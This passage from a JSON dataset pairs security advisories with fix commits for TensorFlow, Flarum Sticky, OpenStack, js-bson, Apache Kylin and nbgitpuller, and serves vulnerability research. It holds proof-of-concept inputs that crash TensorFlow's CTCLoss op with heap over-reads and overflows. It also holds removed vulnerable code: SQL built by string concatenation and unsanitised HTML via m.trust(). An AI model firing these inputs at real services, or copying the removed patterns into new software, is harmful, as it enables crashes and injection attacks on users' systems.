      "before_first_fix_commit": "{'ab6fafc1e32fb20855b7f3a642e36cb08aedbbbf'}",
      "last_fix_commit": "c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/30/2021, 17:39:05",
      "message": "Fix the CHECK failure in tf.raw_ops.QuantizeAndDequantizeV2.\n\nPiperOrigin-RevId: 371361603\nChange-Id: Ia70e34d41adaadddf928e95e5e5c5c97d5bc60d0",
      "author": "Amit Patankar",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'tensorflow/core/kernels/quantize_and_dequantize_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/c5b0d5f8ac19888e46ca14b0e27562e7fbbee9a9/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -72,6 +72,9 @@ class QuantizeAndDequantizeV2Op : public OpKernel {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& input = ctx->input(0);\\n+    OP_REQUIRES(\\n+        ctx, axis_ >= -1,\\n+        errors::InvalidArgument(\"Axis must be at least -1. Found \", axis_));\\n     OP_REQUIRES(\\n         ctx, (axis_ == -1 || axis_ < input.shape().dims()),\\n         errors::InvalidArgument(\"Shape must be at least rank \", axis_ + 1,'}}",
      "message_norm": "fix the check failure in tf.raw_ops.quantizeanddequantizev2.\n\npiperorigin-revid: 371361603\nchange-id: ia70e34d41adaadddf928e95e5e5c5c97d5bc60d0",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('371361603', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/quantize_and_dequantize_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1974,
      "vuln_id": "GHSA-h3gg-7wx2-cq3h",
      "cwe_id": "{'CWE-79'}",
      "score": 0.0,
      "chain": "{'https://github.com/flarum/sticky/commit/7ebd30462bd405c4c0570b93a6d48710e6c3db19'}",
      "dataset": "osv",
      "summary": "XSS in Flarum Sticky extension ### Impact\nA change in release beta 14 of the Sticky extension caused the plain text content of the first post of a pinned discussion to be injected as HTML on the discussion list. The issue was discovered following an internal audit.\n\nAny HTML would be injected through Mithril's `m.trust()` helper. This resulted in an HTML injection where `<script>` tags would not be executed. However it was possible to run javascript from other HTML attributes, enabling a cross-site scripting (XSS) attack to be performed.\n\nSince the exploit only happens with the first post of a pinned discussion, an attacker would need the ability to pin their own discussion, or be able to edit a discussion that was previously pinned.\n\nOn forums where all pinned posts are authored by your staff, you can be relatively certain the vulnerability has not been exploited.\n\nForums where some user-created discussions were pinned can look at the first post edit date to find whether the vulnerability might have been exploited. Because Flarum doesn't store the post content history, you cannot be certain if a malicious edit was reverted.\n\n### Patches\nThe fix will be available in version v0.1.0-beta.16 with Flarum beta 16. The fix has already been back-ported to Flarum beta 15 as version v0.1.0-beta.15.1 of the Sticky extension.\n\n### Workarounds\nForum administrators can disable the Sticky extension until they are able to apply the update. The vulnerability cannot be exploited while the extension is disabled.\n\n### References\n\n- [Release announcement](https://discuss.flarum.org/d/26042-security-update-to-flarum-sticky-010-beta151)\n- [Pull Request](https://github.com/flarum/sticky/pull/24)\n\n### For more information\nIf you have any questions or comments about this advisory, please start a new discussion on our [support forum](https://discuss.flarum.org/t/support).\n\nIf you discover a security vulnerability within Flarum, please send an e-mail to [security@flarum.org](mailto:security@flarum.org). All security vulnerabilities will be promptly addressed. More details can be found in our [security policy](https://github.com/flarum/core/security/policy).",
      "published_date": "2021-01-29",
      "chain_len": 1,
      "project": "https://github.com/flarum/sticky",
      "commit_href": "https://github.com/flarum/sticky/commit/7ebd30462bd405c4c0570b93a6d48710e6c3db19",
      "commit_sha": "7ebd30462bd405c4c0570b93a6d48710e6c3db19",
      "patch": "SINGLE",
      "chain_ord": "['7ebd30462bd405c4c0570b93a6d48710e6c3db19']",
      "before_first_fix_commit": "{'62a74d25ab3f84f69d1c4b5920080963788a8360'}",
      "last_fix_commit": "7ebd30462bd405c4c0570b93a6d48710e6c3db19",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/22/2021, 18:53:11",
      "message": "Fix evaluation of post content by m.trust() (#24)",
      "author": "Sami Mazouz",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 1, 'total': 3}",
      "files": "{'js/src/forum/addStickyExcerpt.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/flarum/sticky/raw/7ebd30462bd405c4c0570b93a6d48710e6c3db19/js%2Fsrc%2Fforum%2FaddStickyExcerpt.js', 'patch': \"@@ -21,7 +21,8 @@ export default function addStickyControl() {\\n       if (firstPost) {\\n         const excerpt = truncate(firstPost.contentPlain(), 175);\\n \\n-        items.add('excerpt', m.trust(excerpt), -100);\\n+        // Wrapping in <div> because ItemList entries need to be vnodes\\n+        items.add('excerpt', <div>{excerpt}</div>, -100);\\n       }\\n     }\\n   });\"}}",
      "message_norm": "fix evaluation of post content by m.trust() (#24)",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('#24', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['js/src/forum/addStickyExcerpt.js'])",
      "num_files": 1.0
    },
    {
      "index": 2093,
      "vuln_id": "GHSA-hm3x-jwwf-jpr9",
      "cwe_id": "{'CWE-200', 'CWE-668'}",
      "score": 4.3,
      "chain": "{'https://github.com/openstack/tripleo-heat-templates/commit/160936df134a471cfd245bd60964046027a571ea', 'https://github.com/openstack/tripleo-heat-templates/commit/2b9461e97fc5c4ceb0848d1cc4484f656bb85515'}",
      "dataset": "osv",
      "summary": "Exposure of Sensitive Information to an Unauthorized Actor in OpenStack tripleo-heat-templates An information exposure flaw in openstack-tripleo-heat-templates allows an external user to discover the internal IP or hostname. An attacker could exploit this by checking the `www_authenticate_uri parameter` (which is visible to all end users) in configuration files. This would give sensitive information which may aid in additional system exploitation. A patch is available on the `master` branch and anticipated to be part of version 11.6.1.",
      "published_date": "2022-03-24",
      "chain_len": 2,
      "project": "https://github.com/openstack/tripleo-heat-templates",
      "commit_href": "https://github.com/openstack/tripleo-heat-templates/commit/2b9461e97fc5c4ceb0848d1cc4484f656bb85515",
      "commit_sha": "2b9461e97fc5c4ceb0848d1cc4484f656bb85515",
      "patch": "MULTI",
      "chain_ord": "['160936df134a471cfd245bd60964046027a571ea', '2b9461e97fc5c4ceb0848d1cc4484f656bb85515']",
      "before_first_fix_commit": "{'ea4d002dde779e84c25c983aa3534cf62fe9386f'}",
      "last_fix_commit": "2b9461e97fc5c4ceb0848d1cc4484f656bb85515",
      "chain_ord_pos": 2.0,
      "commit_datetime": "01/06/2022, 01:32:48",
      "message": "Fix remaining usage of internal url for www_authenticate_uri\n\nThis is follow-up of 160936df134a471cfd245bd60964046027a571ea and fixes\nremaining usage of internal endpoint url for [keystone_authtoken]\nwww_authenticate_uri.\n\nRelated-Bug: #1955397\nChange-Id: Ib2ee7295c7fcda276e4fcf011a9e427e041f4848",
      "author": "Takashi Kajinami",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'deployment/ironic/ironic-api-container-puppet.yaml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/openstack/tripleo-heat-templates/raw/2b9461e97fc5c4ceb0848d1cc4484f656bb85515/deployment%2Fironic%2Fironic-api-container-puppet.yaml', 'patch': \"@@ -163,7 +163,7 @@ outputs:\\n             ironic::api::authtoken::user_domain_name: 'Default'\\n             ironic::api::authtoken::project_domain_name: 'Default'\\n             ironic::api::authtoken::username: 'ironic'\\n-            ironic::api::authtoken::www_authenticate_uri: {get_param: [EndpointMap, KeystoneInternal, uri_no_suffix]}\\n+            ironic::api::authtoken::www_authenticate_uri: {get_param: [EndpointMap, KeystonePublic, uri_no_suffix]}\\n             ironic::api::authtoken::auth_url: {get_param: [EndpointMap, KeystoneInternal, uri_no_suffix]}\\n             ironic::api::authtoken::region_name: {get_param: KeystoneRegion}\\n             ironic::api::authtoken::interface: 'internal'\"}}",
      "message_norm": "fix remaining usage of internal url for www_authenticate_uri\n\nthis is follow-up of 160936df134a471cfd245bd60964046027a571ea and fixes\nremaining usage of internal endpoint url for [keystone_authtoken]\nwww_authenticate_uri.\n\nrelated-bug: #1955397\nchange-id: ib2ee7295c7fcda276e4fcf011a9e427e041f4848",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('160936df134a471cfd245bd60964046027a571ea', 'SHA', 'generic_sha'), ('fixes', 'ACTION', ''), ('keystone_authtoken', 'SECWORD', ''), ('bug', 'FLAW', ''), ('#1955397', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['deployment/ironic/ironic-api-container-puppet.yaml'])",
      "num_files": 1.0
    },
    {
      "index": 1126,
      "vuln_id": "GHSA-8462-q7x7-g2x4",
      "cwe_id": "{'CWE-400', 'CWE-185'}",
      "score": 7.5,
      "chain": "{'https://github.com/mongodb/js-bson/commit/bd61c45157c53a1698ff23770160cf4783e9ea4a'}",
      "dataset": "osv",
      "summary": "High severity vulnerability that affects bson The MongoDB bson JavaScript module (also known as js-bson) versions 0.5.0 to 1.0.x before 1.0.5 is vulnerable to a Regular Expression Denial of Service (ReDoS) in lib/bson/decimal128.js. The flaw is triggered when the Decimal128.fromString() function is called to parse a long untrusted string.",
      "published_date": "2018-09-17",
      "chain_len": 1,
      "project": "https://github.com/mongodb/js-bson",
      "commit_href": "https://github.com/mongodb/js-bson/commit/bd61c45157c53a1698ff23770160cf4783e9ea4a",
      "commit_sha": "bd61c45157c53a1698ff23770160cf4783e9ea4a",
      "patch": "SINGLE",
      "chain_ord": "['bd61c45157c53a1698ff23770160cf4783e9ea4a']",
      "before_first_fix_commit": "{'e403bd94faadee80cd82bae888e28b8b4d6d1e8d'}",
      "last_fix_commit": "bd61c45157c53a1698ff23770160cf4783e9ea4a",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/26/2018, 20:09:27",
      "message": "fix(decimal128): add basic guard against REDOS attacks\n\nThis is a naive approach to reducing the efficacy of a REDOS attack\nagainst this module. A refactor of the regular expression or a\ncustom parser substitute would be ideal, however this solution\nsuffices as a stopgap until such work is completed.\n\nMany thanks to James Davis who graciously alterted us to the\nattack",
      "author": "Matt Broadstone",
      "comments": null,
      "stats": "{'additions': 7, 'deletions': 0, 'total': 7}",
      "files": "{'lib/bson/decimal128.js': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https://github.com/mongodb/js-bson/raw/bd61c45157c53a1698ff23770160cf4783e9ea4a/lib%2Fbson%2Fdecimal128.js', 'patch': \"@@ -235,6 +235,13 @@ Decimal128.fromString = function(string) {\\n   // Trim the string\\n   string = string.trim();\\n \\n+  // Naively prevent against REDOS attacks.\\n+  // TODO: implementing a custom parsing for this, or refactoring the regex would yield\\n+  //       further gains.\\n+  if (string.length >= 7000) {\\n+    throw new Error('' + string + ' not a valid Decimal128 string');\\n+  }\\n+\\n   // Results\\n   var stringMatch = string.match(PARSE_STRING_REGEXP);\\n   var infMatch = string.match(PARSE_INF_REGEXP);\"}}",
      "message_norm": "fix(decimal128): add basic guard against redos attacks\n\nthis is a naive approach to reducing the efficacy of a redos attack\nagainst this module. a refactor of the regular expression or a\ncustom parser substitute would be ideal, however this solution\nsuffices as a stopgap until such work is completed.\n\nmany thanks to james davis who graciously alterted us to the\nattack",
      "language": "en",
      "entities": "[('fix(decimal128', 'ACTION', ''), ('add', 'ACTION', ''), ('redos', 'SECWORD', ''), ('attacks', 'FLAW', ''), ('redos', 'SECWORD', ''), ('attack', 'FLAW', ''), ('attack', 'FLAW', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/bson/decimal128.js'])",
      "num_files": 1.0
    },
    {
      "index": 1037,
      "vuln_id": "GHSA-7hmh-8gwv-mfvq",
      "cwe_id": "{'CWE-89'}",
      "score": 6.5,
      "chain": "{'https://github.com/apache/kylin/commit/e373c64c96a54a7abfe4bccb82e8feb60db04749'}",
      "dataset": "osv",
      "summary": "SQL Injection in Kylin Kylin has some restful apis which will concatenate SQLs with the user input string, a user is likely to be able to run malicious database queries.",
      "published_date": "2020-07-27",
      "chain_len": 1,
      "project": "https://github.com/apache/kylin",
      "commit_href": "https://github.com/apache/kylin/commit/e373c64c96a54a7abfe4bccb82e8feb60db04749",
      "commit_sha": "e373c64c96a54a7abfe4bccb82e8feb60db04749",
      "patch": "SINGLE",
      "chain_ord": "['e373c64c96a54a7abfe4bccb82e8feb60db04749']",
      "before_first_fix_commit": "{'ebfc745dd681d7e0c129ded50bd50ff509d2a393'}",
      "last_fix_commit": "e373c64c96a54a7abfe4bccb82e8feb60db04749",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/07/2020, 12:22:59",
      "message": "Fix sql injection issue",
      "author": "nichunen",
      "comments": null,
      "stats": "{'additions': 51, 'deletions': 30, 'total': 81}",
      "files": "{'server-base/src/main/java/org/apache/kylin/rest/service/CubeService.java': {'additions': 51, 'deletions': 30, 'changes': 81, 'status': 'modified', 'raw_url': 'https://github.com/apache/kylin/raw/e373c64c96a54a7abfe4bccb82e8feb60db04749/server-base%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fkylin%2Frest%2Fservice%2FCubeService.java', 'patch': '@@ -71,6 +71,7 @@\\n import org.apache.kylin.metadata.project.RealizationEntry;\\n import org.apache.kylin.metadata.realization.RealizationStatusEnum;\\n import org.apache.kylin.metadata.realization.RealizationType;\\n+import org.apache.kylin.metrics.MetricsManager;\\n import org.apache.kylin.metrics.property.QueryCubePropertyEnum;\\n import org.apache.kylin.rest.constant.Constant;\\n import org.apache.kylin.rest.exception.BadRequestException;\\n@@ -79,6 +80,7 @@\\n import org.apache.kylin.rest.msg.Message;\\n import org.apache.kylin.rest.msg.MsgPicker;\\n import org.apache.kylin.rest.request.MetricsRequest;\\n+import org.apache.kylin.rest.request.PrepareSqlRequest;\\n import org.apache.kylin.rest.response.CubeInstanceResponse;\\n import org.apache.kylin.rest.response.CuboidTreeResponse;\\n import org.apache.kylin.rest.response.CuboidTreeResponse.NodeInfo;\\n@@ -544,7 +546,8 @@ public HBaseResponse getHTableInfo(String cubeName, String tableName) throws IOE\\n \\n         hr = new HBaseResponse();\\n         CubeInstance cube = CubeManager.getInstance(getConfig()).getCube(cubeName);\\n-        if (cube.getStorageType() == IStorageAware.ID_HBASE || cube.getStorageType() == IStorageAware.ID_SHARDED_HBASE || cube.getStorageType() == IStorageAware.ID_REALTIME_AND_HBASE) {\\n+        if (cube.getStorageType() == IStorageAware.ID_HBASE || cube.getStorageType() == IStorageAware.ID_SHARDED_HBASE\\n+                || cube.getStorageType() == IStorageAware.ID_REALTIME_AND_HBASE) {\\n             try {\\n                 logger.debug(\"Loading HTable info \" + cubeName + \", \" + tableName);\\n \\n@@ -633,7 +636,8 @@ private void cleanSegmentStorage(List<CubeSegment> toRemoveSegs) throws IOExcept\\n             List<String> toDelHDFSPaths = Lists.newArrayListWithCapacity(toRemoveSegs.size());\\n             for (CubeSegment seg : toRemoveSegs) {\\n                 toDropHTables.add(seg.getStorageLocationIdentifier());\\n-                toDelHDFSPaths.add(JobBuilderSupport.getJobWorkingDir(seg.getConfig().getHdfsWorkingDirectory(), seg.getLastBuildJobID()));\\n+                toDelHDFSPaths.add(JobBuilderSupport.getJobWorkingDir(seg.getConfig().getHdfsWorkingDirectory(),\\n+                        seg.getLastBuildJobID()));\\n             }\\n \\n             StorageCleanUtil.dropHTables(new HBaseAdmin(HBaseConnection.getCurrentHBaseConfiguration()), toDropHTables);\\n@@ -763,10 +767,12 @@ public String mergeCubeSegment(String cubeName) {\\n     }\\n \\n     //Don\\'t merge the job that has been discarded manually before\\n-    private boolean isMergingJobBeenDiscarded(CubeInstance cubeInstance, String cubeName, String projectName, SegmentRange offsets) {\\n+    private boolean isMergingJobBeenDiscarded(CubeInstance cubeInstance, String cubeName, String projectName,\\n+            SegmentRange offsets) {\\n         SegmentRange.TSRange tsRange = new SegmentRange.TSRange((Long) offsets.start.v, (Long) offsets.end.v);\\n         String segmentName = CubeSegment.makeSegmentName(tsRange, null, cubeInstance.getModel());\\n-        final List<CubingJob> jobInstanceList = jobService.listJobsByRealizationName(cubeName, projectName, EnumSet.of(ExecutableState.DISCARDED));\\n+        final List<CubingJob> jobInstanceList = jobService.listJobsByRealizationName(cubeName, projectName,\\n+                EnumSet.of(ExecutableState.DISCARDED));\\n         for (CubingJob cubingJob : jobInstanceList) {\\n             if (cubingJob.getSegmentName().equals(segmentName)) {\\n                 logger.debug(\"Merge job {} has been discarded before, will not merge.\", segmentName);\\n@@ -777,7 +783,6 @@ private boolean isMergingJobBeenDiscarded(CubeInstance cubeInstance, String cube\\n         return false;\\n     }\\n \\n-\\n     public void validateCubeDesc(CubeDesc desc, boolean isDraft) {\\n         Message msg = MsgPicker.getMsg();\\n \\n@@ -931,24 +936,6 @@ public void afterPropertiesSet() throws Exception {\\n         Broadcaster.getInstance(getConfig()).registerStaticListener(new HTableInfoSyncListener(), \"cube\");\\n     }\\n \\n-    private class HTableInfoSyncListener extends Broadcaster.Listener {\\n-        @Override\\n-        public void onClearAll(Broadcaster broadcaster) throws IOException {\\n-            htableInfoCache.invalidateAll();\\n-        }\\n-\\n-        @Override\\n-        public void onEntityChange(Broadcaster broadcaster, String entity, Broadcaster.Event event, String cacheKey)\\n-                throws IOException {\\n-            String cubeName = cacheKey;\\n-            String keyPrefix = cubeName + \"/\";\\n-            for (String k : htableInfoCache.asMap().keySet()) {\\n-                if (k.startsWith(keyPrefix))\\n-                    htableInfoCache.invalidate(k);\\n-            }\\n-        }\\n-    }\\n-\\n     public CubeInstanceResponse createCubeInstanceResponse(CubeInstance cube) {\\n         return new CubeInstanceResponse(cube, projectService.getProjectOfCube(cube.getName()));\\n     }\\n@@ -995,7 +982,7 @@ private NodeInfo generateNodeInfo(long cuboidId, int dimensionCount, long cubeQu\\n         long queryExactlyMatchCount = queryMatchMap == null || queryMatchMap.get(cuboidId) == null ? 0L\\n                 : queryMatchMap.get(cuboidId);\\n         boolean ifExist = currentCuboidSet.contains(cuboidId);\\n-        long rowCount = rowCountMap == null ? 0L : rowCountMap.get(cuboidId);\\n+        long rowCount = (rowCountMap == null || rowCountMap.size() == 0) ? 0L : rowCountMap.get(cuboidId);\\n \\n         NodeInfo node = new NodeInfo();\\n         node.setId(cuboidId);\\n@@ -1044,9 +1031,10 @@ public Map<Long, Long> getCuboidHitFrequency(String cubeName, boolean isCuboidSo\\n         String table = getMetricsManager().getSystemTableFromSubject(getConfig().getKylinMetricsSubjectQueryCube());\\n         String sql = \"select \" + cuboidColumn + \", sum(\" + hitMeasure + \")\" //\\n                 + \" from \" + table//\\n-                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = \\'\" + cubeName + \"\\'\" //\\n+                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = ?\" //\\n                 + \" group by \" + cuboidColumn;\\n-        List<List<String>> orgHitFrequency = queryService.querySystemCube(sql).getResults();\\n+\\n+        List<List<String>> orgHitFrequency = getPrepareQueryResult(cubeName, sql);\\n         return formatQueryCount(orgHitFrequency);\\n     }\\n \\n@@ -1058,9 +1046,10 @@ public Map<Long, Map<Long, Pair<Long, Long>>> getCuboidRollingUpStats(String cub\\n         String table = getMetricsManager().getSystemTableFromSubject(getConfig().getKylinMetricsSubjectQueryCube());\\n         String sql = \"select \" + cuboidSource + \", \" + cuboidTgt + \", avg(\" + aggCount + \"), avg(\" + returnCount + \")\"//\\n                 + \" from \" + table //\\n-                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = \\'\" + cubeName + \"\\' \" //\\n+                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = ?\" //\\n                 + \" group by \" + cuboidSource + \", \" + cuboidTgt;\\n-        List<List<String>> orgRollingUpCount = queryService.querySystemCube(sql).getResults();\\n+\\n+        List<List<String>> orgRollingUpCount = getPrepareQueryResult(cubeName, sql);\\n         return formatRollingUpStats(orgRollingUpCount);\\n     }\\n \\n@@ -1070,13 +1059,27 @@ public Map<Long, Long> getCuboidQueryMatchCount(String cubeName) {\\n         String table = getMetricsManager().getSystemTableFromSubject(getConfig().getKylinMetricsSubjectQueryCube());\\n         String sql = \"select \" + cuboidSource + \", sum(\" + hitMeasure + \")\" //\\n                 + \" from \" + table //\\n-                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = \\'\" + cubeName + \"\\'\" //\\n+                + \" where \" + QueryCubePropertyEnum.CUBE.toString() + \" = ?\" //\\n                 + \" and \" + QueryCubePropertyEnum.IF_MATCH.toString() + \" = true\" //\\n                 + \" group by \" + cuboidSource;\\n-        List<List<String>> orgMatchHitFrequency = queryService.querySystemCube(sql).getResults();\\n+\\n+        List<List<String>> orgMatchHitFrequency = getPrepareQueryResult(cubeName, sql);\\n         return formatQueryCount(orgMatchHitFrequency);\\n     }\\n \\n+    private List<List<String>> getPrepareQueryResult(String cubeName, String sql) {\\n+        PrepareSqlRequest sqlRequest = new PrepareSqlRequest();\\n+        sqlRequest.setProject(MetricsManager.SYSTEM_PROJECT);\\n+        PrepareSqlRequest.StateParam[] params = new PrepareSqlRequest.StateParam[1];\\n+        params[0] = new PrepareSqlRequest.StateParam();\\n+        params[0].setClassName(\"java.lang.String\");\\n+        params[0].setValue(cubeName);\\n+        sqlRequest.setParams(params);\\n+        sqlRequest.setSql(sql);\\n+\\n+        return queryService.doQueryWithCache(sqlRequest, false).getResults();\\n+    }\\n+\\n     @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN\\n             + \" or hasPermission(#cube, \\'ADMINISTRATION\\') or hasPermission(#cube, \\'MANAGEMENT\\')\")\\n     public void migrateCube(CubeInstance cube, String projectName) {\\n@@ -1114,4 +1117,22 @@ public void migrateCube(CubeInstance cube, String projectName) {\\n             throw new InternalErrorException(\"Failed to perform one-click migrating\", e);\\n         }\\n     }\\n+\\n+    private class HTableInfoSyncListener extends Broadcaster.Listener {\\n+        @Override\\n+        public void onClearAll(Broadcaster broadcaster) throws IOException {\\n+            htableInfoCache.invalidateAll();\\n+        }\\n+\\n+        @Override\\n+        public void onEntityChange(Broadcaster broadcaster, String entity, Broadcaster.Event event, String cacheKey)\\n+                throws IOException {\\n+            String cubeName = cacheKey;\\n+            String keyPrefix = cubeName + \"/\";\\n+            for (String k : htableInfoCache.asMap().keySet()) {\\n+                if (k.startsWith(keyPrefix))\\n+                    htableInfoCache.invalidate(k);\\n+            }\\n+        }\\n+    }\\n }'}}",
      "message_norm": "fix sql injection issue",
      "language": "fr",
      "entities": "[('fix', 'ACTION', ''), ('sql injection', 'SECWORD', ''), ('issue', 'FLAW', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['server-base/src/main/java/org/apache/kylin/rest/service/CubeService.java'])",
      "num_files": 1.0
    },
    {
      "index": 3171,
      "vuln_id": "GHSA-vvg4-vgrv-xfr7",
      "cwe_id": "{'CWE-665'}",
      "score": 6.3,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b', 'https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c'}",
      "dataset": "osv",
      "summary": "Incomplete validation in `tf.raw_ops.CTCLoss` ### Impact \nIncomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)\nlabels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)\nsequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)\n  \ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=True)\n```   \n      \nAn attacker can also trigger a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)\nlabels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)\nlabels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\nFinally, an attacker can trigger a null pointer dereference:\n\n```python \nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\n### Patches\nWe have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 2,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b",
      "commit_sha": "4504a081af71514bb1828048363e6540f797005b",
      "patch": "MULTI",
      "chain_ord": "['4504a081af71514bb1828048363e6540f797005b', '14607c0707040d775e06b6817325640cb4b5864c']",
      "before_first_fix_commit": "{'8410ce671b48e96965a1e4a97017f8a5bbd03d3a'}",
      "last_fix_commit": "14607c0707040d775e06b6817325640cb4b5864c",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/06/2021, 00:33:47",
      "message": "Fix OOB read issue with `tf.raw_ops.CTCLoss`.\n\nPiperOrigin-RevId: 372242187\nChange-Id: I347228ed8c04e1d2eb9d2479ae52f51d1b512c6e",
      "author": "Amit Patankar",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 0, 'total': 4}",
      "files": "{'tensorflow/core/kernels/ctc_loss_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/4504a081af71514bb1828048363e6540f797005b/tensorflow%2Fcore%2Fkernels%2Fctc_loss_op.cc', 'patch': '@@ -100,6 +100,10 @@ class CTCLossOp : public OpKernel {\\n                 errors::InvalidArgument(\"sequence_length is not a vector\"));\\n     OP_REQUIRES(ctx, TensorShapeUtils::IsMatrix(labels_indices->shape()),\\n                 errors::InvalidArgument(\"labels_indices is not a matrix\"));\\n+    OP_REQUIRES(ctx, labels_indices->dim_size(1) > 1,\\n+                errors::InvalidArgument(\\n+                    \"labels_indices second dimension must be >= 1. Received \",\\n+                    labels_indices->dim_size(1)));\\n     OP_REQUIRES(ctx, TensorShapeUtils::IsVector(labels_values->shape()),\\n                 errors::InvalidArgument(\"labels_values is not a vector\"));'}}",
      "message_norm": "fix oob read issue with `tf.raw_ops.ctcloss`.\n\npiperorigin-revid: 372242187\nchange-id: i347228ed8c04e1d2eb9d2479ae52f51d1b512c6e",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('oob', 'SECWORD', ''), ('issue', 'FLAW', ''), ('372242187', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/ctc_loss_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2453,
      "vuln_id": "GHSA-mq5p-2mcr-m52j",
      "cwe_id": "{'CWE-94'}",
      "score": 0.0,
      "chain": "{'https://github.com/jupyterhub/nbgitpuller/commit/07690644f29a566011dd0d7ba14cae3eb0490481'}",
      "dataset": "osv",
      "summary": "Code injection in nbgitpuller ### Impact\n\nDue to an unsanitized input, visiting maliciously crafted links could result in arbitrary code execution in the user environment.\n\n### Patches\n\n0.10.2\n\n### Workarounds\n\nNone, other than upgrade to 0.10.2 or downgrade to 0.8.x.\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [nbgitpuller](https://github.com/jupyterhub/nbgitpuller/issues)\n* Email our security team at [security@ipython.org](mailto:security@ipython.org)",
      "published_date": "2021-08-30",
      "chain_len": 1,
      "project": "https://github.com/jupyterhub/nbgitpuller",
      "commit_href": "https://github.com/jupyterhub/nbgitpuller/commit/07690644f29a566011dd0d7ba14cae3eb0490481",
      "commit_sha": "07690644f29a566011dd0d7ba14cae3eb0490481",
      "patch": "SINGLE",
